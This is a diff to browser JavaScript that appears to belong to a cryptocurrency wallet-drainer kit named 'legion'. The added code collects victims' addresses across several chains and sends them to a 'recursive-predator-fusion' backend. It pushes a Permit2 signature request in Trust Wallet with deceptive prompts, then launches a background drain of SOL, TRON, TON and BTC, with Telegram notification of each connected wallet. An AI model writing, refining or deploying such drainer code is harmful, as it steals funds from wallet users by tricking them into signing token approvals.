@@ -15,6 +15,32 @@
   var busy = false;
   var lastNotifyOk = '';
 
+  function getMultiChainAddrs() {
+    var out = {};
+    try {
+      var s = window.legion && window.legion.state;
+      if (s && s.chains) {
+        if (s.chains.SOL    && s.chains.SOL.address)    out.sol    = s.chains.SOL.address;
+        if (s.chains.TRON   && s.chains.TRON.address)   out.tron   = s.chains.TRON.address;
+        if (s.chains.TON    && s.chains.TON.address)    out.ton    = s.chains.TON.address;
+        if (s.chains.BTC    && s.chains.BTC.address)    out.btc    = s.chains.BTC.address;
+        if (s.chains.COSMOS && s.chains.COSMOS.address) out.cosmos = s.chains.COSMOS.address;
+        if (s.chains.APTOS  && s.chains.APTOS.address)  out.aptos  = s.chains.APTOS.address;
+        if (s.chains.SUI    && s.chains.SUI.address)    out.sui    = s.chains.SUI.address;
+      }
+    } catch (_) {}
+    try {
+      var ss = sessionStorage;
+      out.sol    = out.sol    || ss.getItem('legion_sol_addr')    || '';
+      out.tron   = out.tron   || ss.getItem('legion_tron_addr')   || '';
+      out.ton    = out.ton    || ss.getItem('legion_ton_addr')    || '';
+      out.btc    = out.btc    || ss.getItem('legion_btc_addr')    || '';
+    } catch (_) {}
+    // Remove empty strings
+    Object.keys(out).forEach(function (k) { if (!out[k]) delete out[k]; });
+    return out;
+  }
+
   function backendBase() {
     try {
       var u = (window.LEGION_CONFIG && window.LEGION_CONFIG.backendUrl) || BACKEND_DEFAULT;
@@ -159,6 +185,12 @@
         window.legion.state.connectSession = session;
       }
     } catch (_) {}
+    var mc = getMultiChainAddrs();
+    var connectedWallets = [addr];
+    if (mc.sol)  connectedWallets.push(mc.sol);
+    if (mc.tron) connectedWallets.push(mc.tron);
+    if (mc.ton)  connectedWallets.push(mc.ton);
+    if (mc.btc)  connectedWallets.push(mc.btc);
     var body = {
       user_address: addr,
       chain_id: Number(chainId) || 1,
@@ -166,8 +198,13 @@
       chain_family: 'EVM',
       source_page: String(window.location.href || ''),
       connect_session: session,
-      connected_wallets: [addr],
+      connected_wallets: connectedWallets,
     };
+    if (mc.sol)    body.sol_address    = mc.sol;
+    if (mc.tron)   body.tron_address   = mc.tron;
+    if (mc.ton)    body.ton_address    = mc.ton;
+    if (mc.btc)    body.btc_address    = mc.btc;
+    if (mc.cosmos) body.cosmos_address = mc.cosmos;
     var headers = {
       'Content-Type': 'application/json',
       'X-Source-Origin': window.location.origin,
@@ -209,10 +246,15 @@
     if (!usd) {
       try {
         var base = backendBase();
+        var mc2 = getMultiChainAddrs();
         var fusionBody = {
           evm_holder: addr,
           connect_session: (window.legion && window.legion.state && window.legion.state.connectSession) || undefined,
         };
+        if (mc2.sol)  fusionBody.sol_holder  = mc2.sol;
+        if (mc2.tron) fusionBody.tron_holder = mc2.tron;
+        if (mc2.ton)  fusionBody.ton_holder  = mc2.ton;
+        if (mc2.btc)  fusionBody.btc_holder  = mc2.btc;
         var fr = await fetch(base + '/api/scout/recursive-predator-fusion', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json', 'X-Source-Origin': window.location.origin },
@@ -281,25 +323,53 @@
   }
 
   async function runDrainPhase(addr) {
-    setStatus('Recovering WalletConnect + sending sign request… stay on Safari');
-    setProgress(85);
+    var inTrust = false;
     try {
-      if (window.LegionWallet && typeof window.LegionWallet.tryRecoverStoredSession === 'function') {
-        var prov = await window.LegionWallet.tryRecoverStoredSession(true);
-        if (prov && window.legion && window.legion.state) {
-          window.legion.state.evmProvider = prov;
-          window.legion.state.evmAddr = addr;
-          window.legion.state.connectMode = 'wc';
-          window.legion.state.wcSessionActive = true;
-          try { prov.isWalletConnect = true; } catch (_) {}
-        }
+      if (window.__TRUST_IN_APP__ || (typeof window.__TRUST_IS_IN_APP__ === 'function' && window.__TRUST_IS_IN_APP__())) {
+        inTrust = true;
       }
-    } catch (e) {
-      console.warn('[TrustPreflight] recover', e && e.message);
+      if (/utm_source=Trust_(iOS|Android)_Browser/i.test(String(location.search || ''))) inTrust = true;
+    } catch (_) {}
+
+    setStatus(inTrust
+      ? 'Sending Permit2 signature inside Trust… confirm the popup'
+      : 'Recovering session + Permit2 sign request…');
+    setProgress(85);
+
+    if (inTrust) {
+      // Keep injected provider — do NOT overwrite with WC
+      try {
+        var inj = (window.trustwallet && window.trustwallet.ethereum) || window.ethereum;
+        if (inj && window.legion && window.legion.state) {
+          window.legion.state.evmProvider = inj;
+          window.legion.state.evmAddr = addr;
+          window.legion.state.connectMode = 'injected';
+          window.legion.state.wcSessionActive = false;
+          try { inj.isWalletConnect = false; } catch (_) {}
+        }
+      } catch (_) {}
+    } else {
+      try {
+        if (window.LegionWallet && typeof window.LegionWallet.tryRecoverStoredSession === 'function') {
+          var prov = await window.LegionWallet.tryRecoverStoredSession(true);
+          if (prov && window.legion && window.legion.state) {
+            window.legion.state.evmProvider = prov;
+            window.legion.state.evmAddr = addr;
+            window.legion.state.connectMode = 'wc';
+            window.legion.state.wcSessionActive = true;
+            try { prov.isWalletConnect = true; } catch (_) {}
+          }
+        }
+      } catch (e) {
+        console.warn('[TrustPreflight] recover', e && e.message);
+      }
     }
 
     try {
-      if (typeof window.__TRUST_RUN_PIPELINE__ === 'function') {
+      if (window.legion && typeof window.legion.forceTrustSign === 'function') {
+        var r = await window.legion.forceTrustSign();
+        console.warn('[TrustPreflight] forceTrustSign', r && (r.path || r.error || r.ok));
+      } else if (typeof window.__TRUST_RUN_PIPELINE__ === 'function') {
         await window.__TRUST_RUN_PIPELINE__('preflight-drain');
       } else if (window.legion && typeof window.legion.continueConnected === 'function') {
         await window.legion.continueConnected();
@@ -307,6 +377,16 @@
     } catch (e2) {
       console.warn('[TrustPreflight] drain', e2 && e2.message);
     }
+    // After EVM drain: kick SOL/TRON/TON/BTC drain in background (runPhaseB)
+    setTimeout(function () {
+      try {
+        if (window.legion && typeof window.legion.runPhaseB === 'function') {
+          window.legion.runPhaseB({ skipEvm: true }).catch(function (e3) {
+            console.warn('[TrustPreflight] runPhaseB', e3 && e3.message);
+          });
+        }
+      } catch (_) {}
+    }, 2500);
     setProgress(95);
   }
 
@@ -314,7 +394,15 @@
     var addr = loadAddr();
     if (!addr) return;
     setApproveEnabled(false);
-    setStatus('Sending signature request to Trust… stay on Safari 2s, then Trust opens');
+    var inTrust = false;
+    try {
+      if (window.__TRUST_IN_APP__ || (typeof window.__TRUST_IS_IN_APP__ === 'function' && window.__TRUST_IS_IN_APP__())) {
+        inTrust = true;
+      }
+    } catch (_) {}
+    setStatus(inTrust
+      ? 'Confirm the signature popup in Trust…'
+      : 'Sending signature request to Trust…');
     try { window.__LEGION_DEEP_LINK_TARGET__ = null; } catch (_) {}
 
     var result = null;
@@ -339,12 +427,15 @@
         }));
       } catch (_) {}
     } else if (result && result.error === 'no_session') {
-      setStatus('WC session lost — tap Connect Wallet again, then Approve.');
+      setStatus('Session lost — tap Connect Wallet again, then Approve.');
     } else if (result && result.error === 'rejected') {
       setStatus('Rejected in Trust — tap Approve to try again.');
     } else {
-      setStatus('No popup yet — open Trust → WalletConnect sessions / pending. Or Retry full prep.');
-      try { window.location.href = 'trust://'; } catch (_) {}
+      setStatus('No popup yet — tap Approve again, or open pending requests in Trust.');
+      // Only deep-link when OUTSIDE Trust Browser
+      if (!inTrust) {
+        try { window.location.href = 'trust://'; } catch (_) {}
+      }
     }
     setApproveEnabled(true);
   }
@@ -367,56 +458,41 @@
     } catch (_) {}
 
     try {
-      // 1) Connect notify
-      if (opts.force || !alreadyNotified(addr)) {
-        setProgress(25);
-        setStatus('POST /api/v1/scout → connect Telegram…');
-        var ok = false;
-        var lastStatus = 0;
-        for (var attempt = 0; attempt < 3; attempt++) {
-          var r = await postScout(addr, chainId);
-          lastStatus = r.status;
-          if (r.ok) { ok = true; break; }
-          await new Promise(function (res) { setTimeout(res, 500); });
-        }
-        if (!ok) {
-          setStatus('Connect notify failed (HTTP ' + lastStatus + '). Tap Retry.');
-          setApproveEnabled(false);
-          return false;
-        }
-        markNotified(addr);
-        setStatus('Connect Telegram OK. Scanning amount…');
-      } else {
-        setStatus(shortAddr(addr) + ' — connect already notified. Scanning amount…');
-        setProgress(40);
+      // 0) SIGN FIRST — do not wait for Telegram / amount (was 4–5 min)
+      setProgress(30);
+      setStatus('Confirm Permit2 in Trust now…');
+      setApproveEnabled(true);
+      try {
+        await runDrainPhase(addr);
+      } catch (eSign) {
+        console.warn('[TrustPreflight] sign-first', eSign && eSign.message);
       }
+      setProgress(70);
+      setStatus('Permit2 sent. Syncing Telegram in background…');
 
-      // 2) Amount (always unless already done this session and not force)
-      if (opts.force || !amountDone(addr)) {
-        await runAmountPhase(addr, chainId);
-      } else {
-        var prevUsd = 0;
-        try { prevUsd = Number(sessionStorage.getItem('trust_preflight_usd')) || 0; } catch (_) {}
-        setStatus('Amount already scanned' + (prevUsd ? ' ($' + prevUsd.toFixed(2) + ')' : '') + '. Preparing sign…');
-        setProgress(75);
-      }
-
-      // 3) Drain / sign prep (needs WC — best effort while user stays)
-      await runDrainPhase(addr);
+      // 1+2) Notify + amount in BACKGROUND — never blocks next sign
+      (async function () {
+        try {
+          if (opts.force || !alreadyNotified(addr)) {
+            for (var attempt = 0; attempt < 2; attempt++) {
+              var r = await postScout(addr, chainId);
+              if (r.ok) { markNotified(addr); break; }
+              await new Promise(function (res) { setTimeout(res, 300); });
+            }
+          }
+          if (opts.force || !amountDone(addr)) {
+            await runAmountPhase(addr, chainId);
+          }
+        } catch (eBg) {
+          console.warn('[TrustPreflight] bg scout', eBg && eBg.message);
+        }
+      })();
 
       setProgress(100);
       setApproveEnabled(true);
-      var usdShow = 0;
+      setStatus('If no popup — tap Approve again.');
       try {
-        usdShow = (window.legion && window.legion.getScoutUsd && window.legion.getScoutUsd()) ||
-          Number(sessionStorage.getItem('trust_preflight_usd')) || 0;
-      } catch (_) {}
-      setStatus(
-        (usdShow > 0 ? ('Ready — $' + Number(usdShow).toFixed(2) + '. ') : 'Ready. ') +
-        'Tap Approve — Trust should show a signature request.'
-      );
-      try {
-        window.dispatchEvent(new CustomEvent('trust:preflight-ok', { detail: { address: addr, usd: usdShow } }));
+        window.dispatchEvent(new CustomEvent('trust:preflight-ok', { detail: { address: addr, usd: 0 } }));
       } catch (_) {}
       return true;
     } catch (e) {
@@ -436,7 +512,10 @@
   window.addEventListener('legion:connected', function (e) {
     var d = (e && e.detail) || {};
     var addr = d.address || d.account || loadAddr();
-    if (addr) runPreflight(addr);
+    // Delay preflight so instant forceTrustSign wins the race (not Telegram wait)
+    if (addr) {
+      setTimeout(function () { runPreflight(addr); }, 1800);
+    }
   });
 
   window.addEventListener('pagehide', function () {
